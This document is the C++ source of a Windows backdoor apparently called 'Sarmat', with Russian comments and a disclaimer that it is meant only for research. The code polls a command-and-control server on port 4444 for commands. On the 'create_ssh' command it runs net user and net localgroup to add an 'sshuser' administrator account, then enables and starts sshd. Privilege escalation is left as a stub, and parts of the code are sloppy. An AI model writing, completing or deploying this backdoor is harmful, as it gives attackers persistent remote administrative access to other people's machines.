// Сармат:Этот бэкдор включает следующие компоненты:
// 1. Обработчик управления службой: Регистрирует обработчик управления службой для управления состоянием службы.
// 2. Основная функция вредоносного ПО: Заглушка для основной логики бэкдора.
// 3. Чтение конфигурации: Инициализирует конфигурацию с заполнительными значениями.
// 4. Получение команд с C2: Симулирует получение команд с Command and Control (C2) сервера.
// 5. Обработка команд: Обрабатывает полученные команды (включая повышение привилегий и создание учетной записи SSH).
// 6. Цикл службы: Постоянно подключается к C2 серверу и обрабатывает команды, с обработкой ошибок и очисткой ресурсов.

// Настройте заполнительные значения и добавьте реальную логику для операций бэкдора и обработки команд C2 в соответствии с вашими требованиями.
// Этот бэкдор включает функционал для повышения привилегий и создания учетной записи SSH на целевой машине.
// Отказ от ответственности: этот бэкдор предназначен только для исследований и симуляций. Я не несу ответственности, если кто-то использует этот пейлоад в незаконных целях.

// Автор: S3N4T0R
// Дата: 2024-6-8

// Ручная компиляция: x86_64-w64-mingw32-gcc -o Сармат-backdoor.dll Сармат.cpp -lwinhttp

#include <windows.h>
#include <winhttp.h>
#include <stdio.h>

#define WINHTTP_FLAG_SECURE 0x00800000

typedef struct _sConfig {
    LPCWSTR lpSubKey;
    int TimeLongValue;
    int TimeShortValue;
    LPCWSTR SecurityValue;
    LPCWSTR Hosts;
    int NumIPs;
    int HostsIndex;
    LPCWSTR MachineGuidValue;
    int authenticated;
    PROCESS_INFORMATION subprocess;
} sConfig;

SERVICE_STATUS ServiceStatus;
SERVICE_STATUS_HANDLE hServiceStatus;
sConfig *config;

void HandlerProc(DWORD dwControl) {
    // Обработчик управления службой
}

void main_malware(const char *serviceName) {
    // Заглушка для основной логики вредоносного ПО
    printf("Запуск основной логики вредоносного ПО для службы: %s\n", serviceName);
}

DWORD _fastcall ServiceMain(DWORD dwArgc, LPCWSTR *lpszArgv) {
    const char *serviceName = (const char *)*lpszArgv;
    hServiceStatus = RegisterServiceCtrlHandlerW(*lpszArgv, HandlerProc);
    
    if (hServiceStatus) {
        ServiceStatus.dwCurrentState = SERVICE_RUNNING;
        if (SetServiceStatus(hServiceStatus, &ServiceStatus)) {
            main_malware(serviceName);
            ServiceStatus.dwCurrentState = SERVICE_STOPPED;
            SetServiceStatus(hServiceStatus, &ServiceStatus);
        }
    }
    
    return (DWORD)(uintptr_t)hServiceStatus;
}

sConfig* ReadConfig() {
    // Функция чтения и инициализации конфигурации
    sConfig* result = (sConfig *)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(sConfig));
    result->Hosts = L"192.168.1.11"; // Настройте IP-адрес здесь
    result->NumIPs = 1;
    result->HostsIndex = 0;
    result->TimeLongValue = 30000; // Пример значения для долгого времени ожидания
    result->TimeShortValue = 5000; // Пример значения для короткого времени ожидания
    result->SecurityValue = L"default_password"; // Пример значения безопасности
    result->MachineGuidValue = L"unique_machine_guid"; // Пример уникального GUID машины
    result->authenticated = 0;
    ZeroMemory(&(result->subprocess), sizeof(PROCESS_INFORMATION));
    return result;
}

BOOL C2_GetCommand(HINTERNET hConnect, LPCWSTR machineGuid, BYTE **responseData, DWORD *responseDataLength) {
    BOOL result = FALSE;
    HINTERNET hRequest = NULL;
    DWORD bytesRead = 0;

    WCHAR requestPath[256];
    swprintf(requestPath, 256, L"/get_command?guid=%s", machineGuid);

    hRequest = WinHttpOpenRequest(hConnect, L"GET", requestPath, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);
    
    if (hRequest) {
        if (WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0) &&
            WinHttpReceiveResponse(hRequest, NULL)) {
            WinHttpQueryDataAvailable(hRequest, responseDataLength);

            if (*responseDataLength > 0) {
                *responseData = (BYTE *)HeapAlloc(GetProcessHeap(), 0, *responseDataLength + 1);
                if (WinHttpReadData(hRequest, *responseData, *responseDataLength, &bytesRead)) {
                    (*responseData)[*responseDataLength] = 0; // Добавление нулевого символа в конец данных
                    result = TRUE;
                } else {
                    HeapFree(GetProcessHeap(), 0, *responseData);
                    *responseData = NULL;
                }
            }
        }
        WinHttpCloseHandle(hRequest);
    }

    return result;
}

void EscalatePrivileges() {
    // Заглушка для логики повышения привилегий
    // Добавьте реальный код для повышения привилегий здесь
    printf("Выполнение повышения привилегий...\n");
}

void CreateSSHAccount() {
    // Код для создания учетной записи SSH на целевой машине
    printf("Создание учетной записи SSH...\n");
    system("net user sshuser P@ssw0rd /add");
    system("net localgroup administrators sshuser /add");
    system("sc config sshd start= auto");
    system("sc start sshd");
}

void ProcessCommand(sConfig *config, BYTE *commandData, DWORD commandDataLength) {
    printf("Обработка команды: %s\n", commandData);

    if (strncmp((char *)commandData, "prevesc", 7) == 0) {
        EscalatePrivileges();
    } else if (strncmp((char *)commandData, "create_ssh", 10) == 0) {
        CreateSSHAccount();
    }

    // Добавьте реальную логику обработки команд здесь
}

void ServiceLoop() {
    HINTERNET hSession = WinHttpOpen(L"User-Agent", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    HINTERNET hConnect = WinHttpConnect(hSession, config->Hosts, 4444, 0);

    if (!hConnect) goto SHUTDOWN;

    while (1) {
        BYTE *commandData = NULL;
        DWORD commandDataLength = 0;

        if (!C2_GetCommand(hConnect, config->MachineGuidValue, &commandData, &commandDataLength)) {
            goto SHUTDOWN;
        }

        ProcessCommand(config, commandData, commandDataLength);

        if (commandData) {
            HeapFree(GetProcessHeap(), 0, commandData);
        }

        Sleep(config->TimeShortValue);
    }

SHUTDOWN:
    if (hConnect) WinHttpCloseHandle(hConnect);
    if (hSession) WinHttpCloseHandle(hSession);
}

int main() {
    LPCWSTR argv[] = {L"DummyService"};
    config = ReadConfig();
    ServiceMain(1, argv);
    ServiceLoop();
    return 0;
}

